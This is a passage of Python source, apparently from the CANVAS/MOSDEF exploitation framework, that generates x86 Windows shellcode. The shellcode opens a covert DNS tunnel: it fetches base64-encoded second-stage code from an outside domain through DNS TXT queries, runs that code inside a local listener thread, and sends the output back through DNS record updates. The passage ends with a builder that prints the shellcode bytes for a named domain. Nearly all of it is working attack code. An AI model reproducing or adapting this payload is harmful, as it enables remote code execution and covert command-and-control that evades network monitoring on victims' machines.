        codegen.find_function('ws2_32.dll!send')
        codegen.find_function('ws2_32.dll!recv')
        codegen.find_function('ws2_32.dll!select')
        codegen.find_function('ws2_32.dll!closesocket')

        # Dns
        codegen.load_library('dnsapi.dll')
        codegen.find_function('dnsapi.dll!dnsquery_a')
        codegen.find_function('dnsapi.dll!dnsrecordlistfree')
        codegen.find_function('dnsapi.dll!dnsmodifyrecordsinset_a')
        codegen.find_function('dnsapi.dll!dnsreplacerecordseta')
        codegen.find_function('dnsapi.dll!dnsrecordlistfree')

        # capicom
        codegen.load_library('crypt32.dll')
        codegen.find_function('crypt32.dll!CryptStringToBinaryA')
        codegen.find_function('crypt32.dll!CryptBinaryToStringA')

        # kernel32.dll
        codegen.find_function('kernel32.dll!sleep')
        codegen.find_function('kernel32.dll!exitthread')
        codegen.find_function('kernel32.dll!virtualfree')
        codegen.find_function('kernel32.dll!gettickcount')
        codegen.find_function('kernel32.dll!virtualalloc')
        codegen.find_function('kernel32.dll!getlasterror')
        codegen.find_function('kernel32.dll!createthread')
        codegen.find_function('kernel32.dll!getexitcodethread')

        # modes and types (+ unique id)

        # XXX: if we have a defined engine, query it for the index id and payload id
        if self.module and hasattr(self.module, 'engine') == True and self.module.engine:
            mosdef_type = self.module.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id = self.module.engine.getNewMosdefID(self.module)
            x_id = '0x%.8x,0x%.8x' % (mosdef_type, mosdef_id)
        else:
            x_id = '0x%.8x,0x%.8x' % (0, time.time()) # win32 mosdef is index 0 for mosdef type

        logging.info("client id: %s" % x_id)

        codegen._globals.addString('DOMAIN', domain)

        if load_winsock == True:
            # wsastartup
            codegen.main += """
            subl $0x200,%esp
            pushl %esp
            xorl %ebx,%ebx
            movb $0x1,%bh
            movb $0x1,%bl
            pushl %ebx
            call *WSASTARTUP-getpcloc(%ebp)
            addl $0x200,%esp
            """

        codegen._globals.addDword('POP_START')
        codegen._globals.addDword('POP_DELTA')

        codegen._globals.addDword('FDSPOT_BIND')
        codegen._globals.addDword('FDSPOT_CNCT')
        codegen._globals.addDword('MOSDEF_PAGE')
        codegen._globals.addDword('TMP_BUFF')
        codegen._globals.addDword('TMP_BUFFL')

        codegen._globals.addDword('REGROUP_BUFF')
        codegen._globals.addDword('DECODE_BUFF')
        codegen._globals.addDword('ENCODE_BUFF')

        codegen._globals.addDword('S_STEP')                     # S_STEP  = send step    (push loop)
        codegen._globals.addDword('R_STEP')                     # R_STEP  = receive step (pop loop)
        codegen._globals.addDword('S_INDEX')                    # S_INDEX = send index    (push loop)
        codegen._globals.addDword('R_INDEX')                    # R_INDEX = receive index (pop loop)
        codegen._globals.addDword('S_COUNT', s_count)           # S_COUNT = section count  = max section count
        codegen._globals.addDword('S_SIZE',  s_size)            # S_SIZE  = section size   = max section size

        codegen._globals.addDword('DNS_INFO')

        codegen._globals.addDword('MOSDEFHANDLE')

        #typedef struct fd_set {
        #   u_int  fd_count;
        #   SOCKET fd_array[FD_SETSIZE];
        #} fd_set;

        codegen.main += """
        launch_mosdef_thread:
            xorl %eax,%eax
            pushl %eax
            pushl %eax
            pushl %ebp
            leal bind_mosdef-getpcloc(%ebp),%esi
            pushl %esi
            pushl %eax
            pushl %eax
            call *CREATETHREAD-getpcloc(%ebp)
            movl %eax,MOSDEFHANDLE-getpcloc(%ebp)     // Save thread handle

        connect_with_mosdef_thread:
            pushl $0x6
            pushl $0x1
            pushl $0x2
            cld
            call *SOCKET-getpcloc(%ebp)
            movl %eax,FDSPOT_CNCT-getpcloc(%ebp)
            xorl %ebx,%ebx
            pushl %ebx
            pushl %ebx
            pushl $REPLACEHOST // host
            pushl $REPLACEPORT // port
            movl %esp,%ecx
            pushl $0x10
            pushl %ecx
            pushl %eax
            call *CONNECT-getpcloc(%ebp)
            cmpl $-1,%eax
            je exit_mosdef

        alloc_buffers:
            pushl $0x40
            pushl $0x1000
            pushl $0x10000
            pushl $0
            call  *VIRTUALALLOC-getpcloc(%ebp)
            movl  %eax, TMP_BUFF-getpcloc(%ebp)
            addl  $0x300, %eax
            movl  %eax, MOSDEF_PAGE-getpcloc(%ebp)

            pushl $0x40
            pushl $0x1000
            pushl $0x100  // buffer list for 63 dword entries + null
            pushl $0
            call  *VIRTUALALLOC-getpcloc(%ebp)
            movl  %eax, TMP_BUFFL-getpcloc(%ebp)

            pushl $0x40
            pushl $0x1000
            pushl $0x16
            pushl $0
            call  *VIRTUALALLOC-getpcloc(%ebp)
            movl  %eax, DNS_INFO-getpcloc(%ebp)

        initialize_buffer_list:
            xorl %eax, %eax
            movl DNS_INFO-getpcloc(%ebp), %edi
            movl $0x40, %ecx
            cld
            rep  stosl

        configure_dns_info:
            movl DNS_INFO-getpcloc(%ebp),  %eax
            movl $0x1,                    (%eax)
            addl $0x4,                     %eax
            movl $REPLACEDNSHOST,         (%eax)

        initialize_counters:
            movl $0x0, R_INDEX-getpcloc(%ebp) //restart the fragment pop   index
            movl $0x0, S_INDEX-getpcloc(%ebp) //restart the fragment push  index
            movl $0x0, R_STEP-getpcloc(%ebp)  //restart the overall  pop   index
            movl $0x0, S_STEP-getpcloc(%ebp)  //restart the overall  push  index

        // this loops until exit
        select_mosdef_and_dns:
            check_mosdef_thread: //Check if mosdef thread is still alive
                pushl $0
                pushl %esp
                pushl MOSDEFHANDLE-getpcloc(%ebp)
                call  *GETEXITCODETHREAD-getpcloc(%ebp)
                popl  %eax
                cmpl  $259,%eax
                jne   exit

            prepare_fdset:
                pushl FDSPOT_CNCT-getpcloc(%ebp)
                pushl $1
                movl %esp, %esi

            prepare_timeval:
                pushl $TIMEOUT_USECS
                pushl $TIMEOUT_SECS
                movl %esp,%edi

            xorl  %eax, %eax
            pushl %edi // timeout
            pushl %eax
            pushl %eax
            pushl %esi // recv_set
            pushl %eax
            call  *SELECT-getpcloc(%ebp)
            addl  $16, %esp
            cmpl  $1,  %eax

            je mosdef_recv

        // ************ BEG DNS POP ***********
        dns_pop:
            movl $0x0, R_INDEX-getpcloc(%ebp)

            //clean the chunk ptr list
            cld
            xorl  %eax,  %eax
            movl  $0x40, %ecx
            movl  TMP_BUFFL-getpcloc(%ebp), %edi
            rep   stosl

            dns_pop_part:
                push %ecx
                leal DOMAIN-getpcloc(%ebp),  %eax

                incl R_INDEX-getpcloc(%ebp)
                movl R_INDEX-getpcloc(%ebp), %ecx

                movb $0x52, 0x0(%eax) // R = receive 2nd stage part

                movl %eax, %esi
                pop_hs:
                    xorl %edx,  %edx
                    movl %ecx,  %eax
                    movl $100,  %ecx
                    div  %ecx
                    addl $0x30, %eax
                    movb %al,   0x1(%esi)
                    movl %edx,  %ecx
                pop_ts:
                    xorl %edx,  %edx
                    movl %ecx,  %eax
                    movl $10,   %ecx
                    div  %ecx
                    addl $0x30, %eax
                    movb %al,   0x2(%esi)
                    movl %edx,  %ecx
                pop_us:
                    addl $0x30, %ecx
                    movb %cl,   0x3(%esi)

                movl R_STEP-getpcloc(%ebp), %ecx
                pop_s_ts:
                    xorl %edx,  %edx
                    movl %ecx,  %eax
                    movl $10,   %ecx
                    div  %ecx
                    addl $0x30, %eax
                    movb %al,   0x5(%esi)
                    movl %edx,  %ecx
                pop_s_us:
                    addl $0x30, %ecx
                    movb %cl,   0x6(%esi)

                push %eax
                push %ebx
                push %ecx

                call *GETTICKCOUNT-getpcloc(%ebp)
                movl %eax, POP_START-getpcloc(%ebp)
                movl %eax, POP_DELTA-getpcloc(%ebp)

                dns_pop_part_retry:

                movl TMP_BUFF-getpcloc(%ebp), %eax
                movl DNS_INFO-getpcloc(%ebp), %ebx
                leal DOMAIN-getpcloc(%ebp),   %ecx

                // Make query
                pushl $0x0                             // pReserved         = NULL
                pushl %eax                             // ppQueryResultsSet = temp buffer
                pushl %ebx                             // pExtra            = fake dns
                pushl $0x0                             // Options           = DNS_QUERY_STANDARD
                pushl $0x10                            // wType             = DNS_TYPE_TEXT
                pushl %ecx                             // lpstrName         = Rnnn.domain
                call *DNSQUERY_A-getpcloc(%ebp)

                test %eax, %eax
                jz dns_pop_part_ok
                movl POP_DELTA-getpcloc(%ebp), %eax
                movl POP_START-getpcloc(%ebp), %ebx
                movl $MISSING_DNS_TIMEOUT,     %ecx
                sub  %ebx, %eax
                cmp  %ecx, %eax
                jge  exit

                call *GETTICKCOUNT-getpcloc(%ebp)
                movl %eax, POP_DELTA-getpcloc(%ebp)

                pushl $MISSING_DNS_DELAY
                call  *SLEEP-getpcloc(%ebp)

                jmp dns_pop_part_retry

                dns_pop_part_ok:

                pop %ecx
                pop %ebx
                pop %eax

                // Measure returned string chunks
                movl TMP_BUFF-getpcloc(%ebp), %eax

                rr_measurer_beg:
                    xorl %edx, %edx
                    rr_measurer_loop:
                        movl (%eax),     %ebx
                        movl 0x1c(%ebx), %eax

                        push  %edx
                        push  %eax
                        push  %ebx

                        movl  %eax, %edi
                        xorl  %eax, %eax
                        xorl  %ecx, %ecx
                        subl  $1,   %ecx
                        cld
                        repne scasb
                        not   %ecx

                        test %edx, %edx
                        jz    rr_measurer_empty_record
                        dec   %ecx
                        rr_measurer_empty_record:

                        pop   %ebx
                        pop   %eax
                        pop   %edx
                        addl  %ecx, %edx

                        movl 0x00(%ebx), %ecx
                        movl %ebx, %eax
                        test %ecx, %ecx
                        jnz rr_measurer_loop
                    test %edx, %edx
                    jz rr_measurer_end
                    dec %edx
                rr_measurer_end:

                movl TMP_BUFF-getpcloc(%ebp), %eax
                movl (%eax),                  %ebx
                movl 0x1c(%ebx),              %eax

                cmpw $0x002E, (%eax)
                je dns_pop_cleanup_and_restart_pull

                cmpw $0x002D, (%eax)
                je   dns_pop_end

                push %edx // rr content length

                movl %edx,  %ecx
                addl $4,    %ecx

                // alloc chunk
                pushl $0x40
                pushl $0x1000
                pushl %ecx
                pushl $0
                call *VIRTUALALLOC-getpcloc(%ebp)
                //check this return

                pop  %edx
                movl %edx, (%eax)
                addl $4,    %eax
                push %edx

                movl TMP_BUFFL-getpcloc(%ebp), %edi
                movl R_INDEX-getpcloc(%ebp),   %ecx
                dec  %ecx
                cmp  $63, %ecx
                jge  exit      // >63 buffers = fail
                shll $2,  %ecx

                addl %ecx,  %edi
                movl %eax, (%edi)
                movl %eax,  %edi

                // Join returned string chunks
                movl TMP_BUFF-getpcloc(%ebp), %eax

                pushl %edi
                rr_joiner_beg:
                    incl %edi
                    xorl %edx, %edx
                    rr_joiner_loop:
                        movl (%eax),     %ebx
                        movl 0x1c(%ebx), %eax

                        push  %edi
                        push  %edx
                        push  %eax
                        push  %ebx

                        movl  %eax, %edi
                        xorl  %eax, %eax
                        xorl  %ecx, %ecx
                        decl  %ecx
                        cld
                        repne scasb
                        not   %ecx

                        pop   %ebx
                        pop   %eax
                        pop   %edx
                        pop   %edi

                        decl %edi
                        movl %eax, %esi
                        rep  movsb

                        movl (%ebx), %ecx
                        movl  %ebx,  %eax
                        test  %ecx,  %ecx
                        jnz rr_joiner_loop
                rr_joiner_end:
                popl %edi

                cmpb $0x2B, (%edi)
                je dns_pop_part

                dns_pop_end:
                    chunk_measurer_loop_beg:
                    xorl %ecx, %ecx
                    movl TMP_BUFFL-getpcloc(%ebp), %edi
                    chunk_measurer_loop:
                        movl (%edi), %ebx
                        test %ebx, %ebx
                        jz chunk_measurer_loop_end
                        subl $4, %ebx
                        movl (%ebx), %edx
                        addl %edx, %ecx
                        addl $4, %edi
                        jmp chunk_measurer_loop

                    chunk_measurer_loop_end:

                    push  %ecx

                    addl  $8, %ecx

                    pushl $0x40
                    pushl $0x1000
                    pushl %ecx
                    pushl $0
                    call *VIRTUALALLOC-getpcloc(%ebp)

                    pop   %ecx
                    push  %ecx
                    subl  $4,    %ecx
                    movl  %ecx, (%eax)
                    addl  $4,    %eax

                    movl  %eax, REGROUP_BUFF-getpcloc(%ebp)

                    mov   %eax, %edi
                    xorl  %eax, %eax
                    pop   %ecx
                    push  %ecx
                    addl  $4,   %ecx
                    rep   stosb

                    pop   %ecx
                    push  %ecx
                    pushl $0x40
                    pushl $0x1000
                    pushl %ecx
                    pushl $0
                    call *VIRTUALALLOC-getpcloc(%ebp)

                    movl  %eax, DECODE_BUFF-getpcloc(%ebp)

                    mov   %eax, %edi
                    xorl  %eax, %eax
                    pop   %ecx
                    rep   stosb

                    xorl %edx, %edx
                    xorl %ecx, %ecx
                    movl TMP_BUFFL-getpcloc(%ebp),    %esi
                    movl REGROUP_BUFF-getpcloc(%ebp), %edi
                    chunk_joiner_loop:
                        movl (%esi), %ebx
                        test  %ebx,  %ebx
                        jz chunk_joiner_loop_end

                        subl $4,     %ebx
                        movl (%ebx), %ecx
                        addl $4,     %ebx
                        addl $4,     %esi

                        push  %esi
                        inc   %ebx
                        dec   %ecx
                        movl  %ebx,  %esi
                        rep movsb

                        pushad
                        //free the chunk
                        subl $5, %ebx
                        push $0x8000
                        push $0x0
                        push %ebx
                        call *VIRTUALFREE-getpcloc(%ebp)
                        popad

                        pop   %esi
                        jmp chunk_joiner_loop
                    chunk_joiner_loop_end:

                    movl  REGROUP_BUFF-getpcloc(%ebp), %edi
                    xorl  %eax, %eax
                    movl  $-1,  %ecx
                    repne scasb
                    neg   %ecx

                    movl REGROUP_BUFF-getpcloc(%ebp), %esi
                    movl DECODE_BUFF-getpcloc(%ebp),  %edi
                    movl %ecx, -4(%esi)

                    pushl $0x0                             // pdwFlags  = NULL
                    pushl $0x0                             // pdwSkip   = NULL
                    pushl %edi                             // pcbBinary = tmpbuffer[0]
                    movl  %ecx, (%edi)
                    addl  $0x4,  %edi
                    pushl %edi                             // pbBinary  = tmpbuffer[1]
                    pushl $0x1                             // dwFlags   = CRYPT_STRING_BASE64
                    pushl $0x0                             // cchString = NULL
                    pushl %esi                             // pszString = src
                    call *CRYPTSTRINGTOBINARYA-getpcloc(%ebp)

                    movl REGROUP_BUFF-getpcloc(%ebp), %esi
                    subl $4, %esi
                    push $0x8000
                    push $0x0
                    push %esi
                    call *VIRTUALFREE-getpcloc(%ebp)

                    xorl %esi, %esi
                    movl %esi, REGROUP_BUFF-getpcloc(%ebp)

                    // Check if the response zero size, if it is then exit
                    // we should never receive a zero size response and if
                    // we do we should never reach this point
                    movl DECODE_BUFF-getpcloc(%ebp), %ebx

                    //mov (%ebx), %eax
                    //test %eax, %eax
                    //int3
                    //jz dns_pop_cleanup_and_restart_pull

                    //move data to mosdef page
                    mov (%ebx), %ecx
                    mov  %ebx,  %esi
                    addl $4,    %ecx

                    movl MOSDEF_PAGE-getpcloc(%ebp), %edi       // dst
                    cld
                    rep movsb

                    movl $1, R_STEP-getpcloc(%ebp)
                    //incl R_STEP-getpcloc(%ebp)

                    call dns_pop_cleanup
                    jmp mosdef_send

                    dns_pop_cleanup_and_exit:
                        call dns_pop_cleanup
                        jmp exit

                    dns_pop_cleanup_and_restart_pull:
                        call dns_pop_cleanup

                        movl $REPLACESLEEP, %edi
                        test %edi, %edi
                        jz select_mosdef_and_dns

                        pushl %edi
                        call *SLEEP-getpcloc(%ebp)

                        jmp select_mosdef_and_dns

                    dns_pop_cleanup:
                        movl DECODE_BUFF-getpcloc(%ebp), %esi
                        push $0x8000
                        push $0x0
                        push %esi
                        call *VIRTUALFREE-getpcloc(%ebp)

                        ret

                    jmp exit //we shouldn't reach this point =3
        // ************ END DNS POP ***********

        // ************ BEG DNS PUSH ***********
        dns_push:
            movl %eax, %ecx
            shll $2,   %ecx

            push %eax
            push %ecx

            // alloc encode pages
            pushl $0x40
            pushl $0x1000
            pushl %ecx
            pushl $0
            call *VIRTUALALLOC-getpcloc(%ebp)

            test %eax, %eax
            jz   exit

            pop  %ecx
            movl %ecx, (%eax)
            addl $4,    %eax
            movl %eax, ENCODE_BUFF-getpcloc(%ebp)
            pop  %eax

            //push %eax
            //push %ecx

            // Encode received data
            movl ENCODE_BUFF-getpcloc(%ebp), %ebx
            subl  $0x4, %ebx
            pushl %ebx                             // pcchString
            addl  $0x5, %ebx                       //
            pushl %ebx                             // pszString
            pushl $0x1                             // dwFlags
            pushl %eax                             // cbBinary
            pushl MOSDEF_PAGE-getpcloc(%ebp)       // pbBinary
            call *CRYPTBINARYTOSTRINGA-getpcloc(%ebp)

            xorl %edx, %edx
            movl %edx, S_INDEX-getpcloc(%ebp)

            movl ENCODE_BUFF-getpcloc(%ebp), %eax
            subl $0x4,   %eax

            movl (%eax), %eax
            xorl %edx,   %edx
            movl $64,    %ecx // 100 = max push packet size
            div  %ecx
            movl %eax,   %ecx

            incl %ecx
            push %ecx //push parts

            movl ENCODE_BUFF-getpcloc(%ebp), %ebx

            dns_push_part:
                leal DOMAIN-getpcloc(%ebp),  %esi
                movl S_INDEX-getpcloc(%ebp), %ecx
                incl %ecx
                movl %ecx, S_INDEX-getpcloc(%ebp)

                movb $0x53, 0x0(%esi) // S = send 2nd stage output part

                push_hs:
                    xorl %edx,  %edx
                    movl %ecx,  %eax
                    movl $100,  %ecx
                    div  %ecx
                    addl $0x30, %eax
                    movb %al,   0x1(%esi)
                    movl %edx,  %ecx
                push_ts:
                    xorl %edx,  %edx
                    movl %ecx,  %eax
                    movl $10,   %ecx
                    div  %ecx
                    addl $0x30, %eax
                    movb %al,   0x2(%esi)
                    movl %edx,  %ecx
                push_us:
                    addl $0x30, %ecx
                    movb %cl,   0x3(%esi)

                movl S_STEP-getpcloc(%ebp), %ecx
                push_s_ts:
                    xorl %edx,  %edx
                    movl %ecx,  %eax
                    movl $10,   %ecx
                    div  %ecx
                    addl $0x30, %eax
                    movb %al,   0x5(%esi)
                    movl %edx,  %ecx
                push_s_us:
                    addl $0x30, %ecx
                    movb %cl,   0x6(%esi)

                pop   %ecx
                push  %ecx
                movl  S_INDEX-getpcloc(%ebp), %edx
                decl  %edx

                movl %edx,   %eax
                xorl %edx,   %edx
                movl $64,    %ecx
                mul  %ecx
                movl %eax,   %ecx

                push %ecx

                movl  S_INDEX-getpcloc(%ebp), %eax

                xorl %edx,   %edx
                movl $2,     %ecx // 2 = extra chars inserted by the api
                mul  %ecx
                movl %eax,   %edx

                pop  %ecx

                movl ENCODE_BUFF-getpcloc(%ebp), %esi
                addl %ecx, %esi
                addl %edx, %esi
                subl $2,   %esi

                pop   %ecx
                push  %ecx
                movl  S_INDEX-getpcloc(%ebp), %edx
                decl  %edx

                cmp %edx, %ecx

                je dns_push_part_flag_last
                movb $0x2B, (%esi)

                jmp  dns_push_part_update

                dns_push_part_flag_last:
                movb $0x2D, (%esi)

                dns_push_part_update:
                movb $0x0, 65(%esi)

                pushad

                dns_push_part_retry:

                movl TMP_BUFF-getpcloc(%ebp), %edx
                leal DOMAIN-getpcloc(%ebp),   %ebx

                movl $0x0,    0x0(%edx)
                movl %ebx,    0x4(%edx)
                movw $0x10,   0x8(%edx)
                movw $0x0C,   0xA(%edx)
                movl $0x3019, 0xC(%edx)

                movl $1,    0x18(%edx) //cantidad de buffers
                movl %esi,  0x1C(%edx) //puntero  al buffer

                push $0x0
                movl DNS_INFO-getpcloc(%ebp), %ebx
                push %ebx
                push $0x00
                push $0x10
                push $0x00
                push %edx
                call *DNSMODIFYRECORDSINSET_A-getpcloc(%ebp)

                test %eax, %eax
                jnz  dns_push_part_retry

                popad

                cmp %edx, %ecx
                jge dns_push_part

            movl ENCODE_BUFF-getpcloc(%ebp), %eax
            subl $2, %eax

            push $0x8000
            push $0x0
            push %eax
            call *VIRTUALFREE-getpcloc(%ebp)

            //incl S_STEP-getpcloc(%ebp) //increase the send overall index

            jmp select_mosdef_and_dns
        // ************ END DNS PUSH ***********


        // ************ BEG MOSDEF THREAD ***********
        bind_mosdef:
            movl 4(%esp),%ebp // thread arg
            pushl $0x6
            pushl $0x1
            pushl $0x2
            cld
            call *SOCKET-getpcloc(%ebp)
            movl %eax,FDSPOT_BIND-getpcloc(%ebp)
            pushl $0x0
            pushl $0x0
            pushl $REPLACEHOST // 127.0.0.1
            pushl $REPLACEPORT // 5555 / 0x15b3
            movl %esp,%ecx
            pushl $0x10
            pushl %ecx
            pushl %eax
            call *BIND-getpcloc(%ebp)
            incl %eax
            pushl %eax
            pushl FDSPOT_BIND-getpcloc(%ebp)
            call *LISTEN-getpcloc(%ebp)
            pushl %eax
            pushl %eax
            pushl FDSPOT_BIND-getpcloc(%ebp)
            call *ACCEPT-getpcloc(%ebp)
            movl %eax,FDSPOT_BIND-getpcloc(%ebp)

        recvexecloop:
            movl FDSPOT_BIND-getpcloc(%ebp), %edx

        gogetlen:
            pushl %edx
            xorl %eax,%eax
            pushl %eax
            movl %esp,%esi
            pushl %eax
            movb $4,%al
            pushl %eax
            pushl %esi
            pushl %edx
            call *RECV-getpcloc(%ebp)
            cmpb $4, %al
            je gogotlen
            popl %edx
            popl %edx

            jmp exit_mosdef

        gogotlen:
            popl %edi
            pushl $0x40
            pushl $0x1000
            pushl %edi
            pushl $0
            call *VIRTUALALLOC-getpcloc(%ebp)
            popl %edx
            andl $0xFFFFFF00,%esp
            movl %eax,%esi
            movl %eax,%ecx

        gorecvexecloop:
            pushl %edx
            pushl %ecx
            xorl %eax,%eax
            pushl %eax
            pushl %edi
            pushl %ecx
            pushl %edx
            call *RECV-getpcloc(%ebp)
            popl %ecx
            popl %edx
            cmpl $-1,%eax

            je exit_mosdef

            cmpl %eax,%edi

            je stagetwo

            subl %eax,%edi
            addl %eax,%ecx

            jmp gorecvexecloop

        stagetwo:
            push %ebx
            xchg %edx, %esi

            call *%edx
            xchg %edx, %esi
            popl %ebx
            pushl $0x8000 // release
            pushl $0x0
            pushl %esi
            call *VIRTUALFREE-getpcloc(%ebp)

            jmp recvexecloop
        // ************ END MOSDEF THREAD ***********

        // ************ BEG HELPERS ***********
        mosdef_send:
            movl MOSDEF_PAGE-getpcloc(%ebp), %esi
            movl (%esi), %ecx
            addl $4,     %esi

            xorl  %eax, %eax
            pushl %eax
            pushl %ecx
            pushl %esi
            pushl FDSPOT_CNCT-getpcloc(%ebp)
            call *SEND-getpcloc(%ebp)
            cmpl $-1,%eax
            je exit

            jmp select_mosdef_and_dns

        mosdef_recv:
            xorl  %eax,%eax
            pushl %eax
            pushl $0x64
            pushl MOSDEF_PAGE-getpcloc(%ebp)
            pushl FDSPOT_CNCT-getpcloc(%ebp)
            call  *RECV-getpcloc(%ebp)
            cmpl  $-1, %eax
            je exit

            test %eax,%eax
            jnz dns_push

            jmp select_mosdef_and_dns

        exit: // close the socket so the mosdef thread suicides as well
            movl  FDSPOT_BIND-getpcloc(%ebp),%esi
            pushl %esi
            call  *CLOSESOCKET-getpcloc(%ebp)

            pushl $0x8000 // release
            pushl $0
            pushl MOSDEF_PAGE-getpcloc(%ebp)
            call *VIRTUALFREE-getpcloc(%ebp)

        exit_mosdef:
            xorl  %eax, %eax
            pushl %eax
            call *EXITTHREAD-getpcloc(%ebp)
        // ************ END HELPERS ***********

        """

        codegen.main = codegen.main.replace('REPLACESLEEP',   uint32fmt(sleeplen))

        codegen.main = codegen.main.replace('REPLACEDNSHOST', uint32fmt(istr2int(socket.inet_aton(dnsaddr))))

        codegen.main = codegen.main.replace('DOMAINSIZE',    "%d" % len(domain))

        codegen.main = codegen.main.replace('REPLACEHOST', \
                           uint32fmt(istr2int(socket.inet_aton('127.0.0.1'))))

        codegen.main = codegen.main.replace('REPLACEPORT', \
                           uint32fmt(reverseword((0x02000000 | random.randint(5000, 10000)))))


        codegen.main = codegen.main.replace('MISSING_DNS_DELAY',   '5000')
        codegen.main = codegen.main.replace('MISSING_DNS_TIMEOUT', '600000')
        codegen.main = codegen.main.replace('TIMEOUT_USECS',       '500000')
        codegen.main = codegen.main.replace('TIMEOUT_SECS',        '0')

        return codegen.get()


if __name__ == '__main__':
    import sys;
    import struct;
    line = 0
    p = payloads()
    #print "### KOSTYA PAYLOAD EXECUTOR 2000 NG ####"

    asm = p.dns_proxy("CNNN.NN.pxller.com", '192.168.1.11')
    bin = p.assemble(asm)

    try:
        f = open('/home/trapito/bb/res/dns_proxy', 'w')
        b = f.write(bin)
        f = None
    except:
        pass

    # mod 4 align
    while len(bin) % 4:
        bin += "P"
    for c in bin:
        if not line:
            sys.stdout.write("\"")
        sys.stdout.write("\\x%.2x" % ord(c))
        line += 1
        if line == 16:
            sys.stdout.write("\"\n")
            line = 0
    i = 0
    line = 0
    sys.stdout.write("\n");
    while i < len(bin):
        dword = struct.unpack("<L", bin[i:i+4])[0]
        sys.stdout.write("0x%.8X, " % dword)
        line += 1
        i += 4
        if line == 4:
            sys.stdout.write("\n")
            line = 0
    sys.stdout.write("\n")

